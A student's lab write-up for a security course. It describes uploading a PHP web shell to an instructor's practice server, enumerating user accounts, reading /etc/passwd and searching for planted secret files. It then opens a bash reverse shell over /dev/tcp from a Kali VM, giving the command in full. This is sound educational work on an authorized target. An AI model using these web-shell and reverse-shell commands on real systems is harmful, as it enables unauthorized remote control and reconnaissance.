# Our first reverse shell

By Kendra Winhall

## Installing a PHP web shell

* a. Explain how you can execute the Linux command `whoami` on the server using your webshell. What result do you get when you execute that command?
    * I uploaded my webshell to the `uploadedimages` folder under the name `winhallk-webshell1.php`. I executed the command by typing the following into my browser (I could have also used curl and typed the URL in my terminal instead):
    * `http://danger.jeffondich.com/uploadedimages/winhallk-webshell1.php?command=whoami`
    * The output is `www-data`.
* b. What is this webshell's `<pre>` tag for? (And more to the point, what happens if you leave it out?)
    * I uploaded a webshell without the `<pre>` tag, and the output was not formatted. Specifically, spacing between different elements and line breaks were not preserved for the output of the webshell without the `<pre>` tag, and the font was also different. So it seems that the `<pre>` tag preserves the spaces and line breaks in the output.

## Looking around

* a. What directory is danger's website located in?
    * The `pwd` command returns `/var/www/danger.jeffondich.com/uploadedimages` as output. So the website is located in the directory `/var/www/`.
* b. What are the names of all the user accounts on danger.jeffondich.com? How do you know?
    * I know that information about all user accounts is located in `/etc/passwd`. Specifically, their names are located in the first column of that file. While `cat /etc/passwd` didn't work for some reason (the connection resets and I can't view the file), `getent passwd` does. To view the first column of this file, I want to use the `cut` command, specify that the delimiter is a colon, and specify that I want to see the first field, so I use the command `getent passwd | cut -d : -f 1` to get the output:
    *   ```
        root
        daemon
        bin
        sys
        sync
        games
        man
        lp
        mail
        news
        uucp
        proxy
        www-data
        backup
        list
        irc
        gnats
        nobody
        systemd-network
        systemd-resolve
        messagebus
        systemd-timesync
        syslog
        _apt
        tss
        uuidd
        tcpdump
        usbmux
        sshd
        pollinate
        landscape
        fwupd-refresh
        jeff
        postgres
        bullwinkle
        ```
    * These are the names of all the user accounts on danger.jeffondich.com. Two user names that stand out to me are `jeff` and `bullwinkle`.
    
* c. Do you have access to the file /etc/passwd? What's in it?
    * Yes, when I type the command `ls -ld /etc/*passwd` (the command `ls -ld /etc/passwd` makes the connection reset), I can see that I have read permissions for the file `/etc/passwd`.
    * `/etc/passwd` contains information about the users that have an account on danger.jeffondich.com. According to [Wikipedia page for passwd](https://en.wikipedia.org/wiki/Passwd#Password_file), the `passwd` file contains information about each user's name, user ID, group ID, full name/information, home directory, and a couple other things. Here's an excerpt of `/etc/passwd`:
    *   ```
        jeff:x:1000:1000:Jeff Ondich,,,:/home/jeff:/bin/bash
        bullwinkle:x:1001:1001:Bullwinkle J. Moose,,,:/home/bullwinkle:/bin/bash
        ```
    * We can see that there is a user named `jeff`, with user ID and group ID 1000, whose full name is Jeff Ondich, and whose home directory is `/home/jeff`. In addition, there is a user named `bullwinkle`, with user ID and group ID 1001, whose full name is Bullwinkle J. Moose, and whose home directory is `/home/bullwinkle`. The `x` in the second field of both rows indicates that those users' passwords are located in the `shadow` file.

* d. Do you have access to the file /etc/shadow? What's in it? (You'll have to look online for the answer to that second question, since the answer to the first is no.)
    * No, when I type the command `ls -ld /etc/shadow`, I can see that I do not have permissions to read, write, or execute the file. This makes sense--according to the same [Wikipedia page](https://en.wikipedia.org/wiki/Passwd#Shadow_file) as before, the `shadow` file contains each user's hashed password, along with other information about the password. As a result, the file can only be accessed by the root user.
    * According to that Wikipedia page, `/etc/shadow` contains each user's name, a salt and their hashed password, the number of days since the password was last changed, the number of days until the password can be changed (or must be changed), and the number of days until the account expires, and a couple other things.
    
* e. There may be some secret files scattered around. See how many you can find and report on your discoveries.
    * I used the command `find / -type f -name "*secret*"` to find the secret files. The results included:
        * `/opt/more-secrets.txt`, which contained the text "Oh look. You found me!"
        * `/opt/.even-more-secrets.txt` which contained the text "Aw, a little period couldn't hide me? So sad."
        * `/home/jeff/supersecret.txt`, which contained the text "Congratulations!" and some marvelous ASCII art of a moose.
        * `/var/www/danger.jeffondich.com/secrets/kindasecret.txt`, which contained the text "Congratulations!" and some fabulous ASCII art of a frog.
        * `/var/www/danger.jeffondich.com/youwontfindthiswithgobuster/secret.txt`, which contained the text "Congratulations!" and some beautiful ASCII art of two birds.

## Launching a reverse shell

* a. What is the IP address of your Kali VM (the target machine)? How did you find out?
    * My Kali VM's IP is 192.168.64.3. I determined this by running the command `ifconfig | grep inet` and choosing the IP address beginning with 192.168 because that's a private IP address, and I want my two machines to communicate through Carleton's private network.
* b. What are the IP addresses of your host OS (the attacking machine)? How did you find out? Which one should you use to communicate with Kali and why?
    * My host OS's IP is 192.168.64.1. I determined this by running the command `ifconfig | grep inet` and choosing the IP address beginning with 192.168 because that's a private IP address, and I want my two machines to communicate through Carleton's private network. (That's the rationale as to which IP I use to communicate with Kali and why.)
* c. On your host OS (the attacker), pick any port number between 5000 and 10000 and run nc -l -p YOUR_CHOSEN_PORT
    * I chose port 7777. The `-p` flag didn't work for me, but running `nc -l 7777` did.
* d. In a browser on your host machine, use your web shell to go to this crazy URL: `http://KALI_IP/YOUR_WEBSHELL.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22`
    * For me, this URL was `http://192.168.64.3/webshell.php?command=bash -c "bash -i >& /dev/tcp/192.168.64.1/7777 0>&1"`
* e. Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?
    * I have a shell, and it's letting me execute commands on Kali. I know it's my Kali VM for a couple reasons:
        * `ifconfig | grep inet` returns my Kali IP (192.168.64.3).
        * `uname -a` returns `Linux kali 6.8.11-arm64 #1 SMP Kali 6.8.11-1kali2 (2024-05-30) aarch64 GNU/Linux`.
        * In general, the contents of the directories match those on my Kali VM.
* f. What are all those % codes in the URL you used?
    * Those are percent encodings; there are some special characters that URLs cannot contain, so they are replaced with a `%` and a hexadecimal number. According to [this table](https://www.w3schools.com/tags/ref_urlencode.ASP), `%20` represents a space, `%22` represents `"`, `%3E` represents `>`, `%26` represents `&`.
* g. Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.
    * Assume that the target has a web server running. (We launched a web server on Kali with the command `sudo systemctl start apache2`)
    * Next, the attacker must find a way to upload the reverse shell to the target (specifically, in the home directory of the web server).
    * Then, the attacker listens for incoming connections on a particular port (with the command `nc -l <port number>`). 
    * The attacker runs the following command: `http://KALI_IP/YOUR_WEBSHELL.php?command=bash -c "bash -i >& /dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT 0>&1"`. 
        * The webshell that the attacker uploaded to the target machine's web server's home directory executes the command. 
        * The command prompts the target machine's web server to start a bash instance (`bash -c`), which executes the command in quotes.
        * In turn, this inner command starts a new instance of an interactive bash shell (`bash -i`) and initiates a connection to the chosen port (`YOUR_CHOSEN_PORT`) on the attacker's machine (`YOUR_HOST_OS_IP`). In addition, this command redirects standard output and standard error to the attacker's machine through this connection (`>& /dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT`), and redirects standard input to be read from the attacker's machine (`0>&1`) through this connection. Because the target machine is initiating the connection to the attacker, the target machine's firewall doesn't block the connection.
    * Now, when the attacker enters a command in their terminal, it is read as standard input by the new interactive bash instance on the target's machine. The bash shell then executes the command on the target's machine and the resulting output and/or error messages are sent to the attacker's terminal.

